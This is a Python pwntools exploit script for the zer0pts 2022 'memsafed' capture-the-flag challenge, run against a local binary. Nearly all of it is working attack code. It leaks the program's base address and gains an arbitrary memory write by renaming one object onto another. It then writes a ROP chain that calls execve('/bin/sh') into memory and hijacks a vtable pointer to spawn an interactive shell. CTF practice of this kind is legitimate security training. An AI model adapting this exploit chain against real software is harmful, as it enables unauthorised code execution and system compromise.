#!/usr/bin/env python3
from pwn import *

# https://kileak.github.io/ctf/2022/zer0pts-memsafed/

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

p = process('./chall')

def new(name, vlist):
    sla('> ', '1')
    sla('Name: ', name)
    sla('Number of vertices: ', str(len(vlist)))
    for i in range(len(vlist)):
        sla('] = ', str(vlist[i]))

def show(name):
    sla('> ', '1')
    sla('Name: ', name)

def rename(old_name, new_name, c):
    sla('> ', '3')
    sla('(old) Name: ', old_name)
    sla('(new) Name: ', new_name)
    sla('[y/N]: ', c)

def edit(name, idx, val):
    sla('> ', '4')
    sla('Name: ', name)
    sla('Index: ', str(idx))
    sla('] = ', str(val))

def delete(name):
    sla('> ', '5')
    sla('Name: ', name)

# leak elf base
sla('> ', '5')
sla('Name: ', 'a')
ru('_Dmain [')
elf_base = int(r(14)[2:], 16) - 0xa2307
info('elf_base = ' + hex(elf_base))

# arbitrary write
new('A', [(1234, 5678)] * 3)
new('B', [(8765, 4321)] * 3)
rename('A', 'B', 'n')

def write(addr, val):
    edit('A', int(addr / 8), (iu32(val[:4]), iu32(val[4:])))

target_addr = elf_base + 0x000000000014C070
buffer_addr = elf_base + 0x168400
# 0x00000000000a459a : push rcx ; or byte ptr [rax - 0x75], cl ; pop rsp ; and al, 8 ; add rsp, 0x18 ; ret
stack_pivot_ret = elf_base + 0x00000000000a459a
pop_rdi_ret = elf_base + 0x000000000011f893
pop_rsi_r15_ret = elf_base + 0x000000000011f891
# 0x0000000000107c56 : pop rdx ; xor eax, 0x89480001 ; ret
pop_rdx_ret = elf_base + 0x0000000000107c56
pop_rax_ret = elf_base + 0x00000000000aa2cd
syscall = elf_base + 0x00000000000d1ab1
pop_r12_ret = elf_base + 0x00000000000aa575
ret = elf_base + 0x00000000000a001a

# write rop chain to vtable
bin_sh_addr = elf_base + 0x168480
payload = up64(buffer_addr)
payload += up64(0)
payload += up64(0)
payload += up64(ret) # 0x18
payload += up64(pop_r12_ret)
payload += up64(stack_pivot_ret) # 0x28
payload += up64(pop_rdi_ret)
payload += up64(bin_sh_addr)
payload += up64(pop_rsi_r15_ret)
payload += up64(0)
payload += up64(0)
payload += up64(pop_rdx_ret)
payload += up64(0)
payload += up64(pop_rax_ret)
payload += up64(59)
payload += up64(syscall)
payload += "/bin/sh\x00"
for i in range(0, len(payload), 8):
    write(buffer_addr + i, payload[i:i+8])

# write vtable address
write(target_addr + 0x18, up64(buffer_addr))

info('target_addr = ' + hex(target_addr))
info('payload = ' + hex(buffer_addr + 0x18))
#gdb.attach(p, 'pie breakpoint 0xd41bc\nc')

# trigger rop
new('123', [(1, 2)] * 3)

p.interactive()

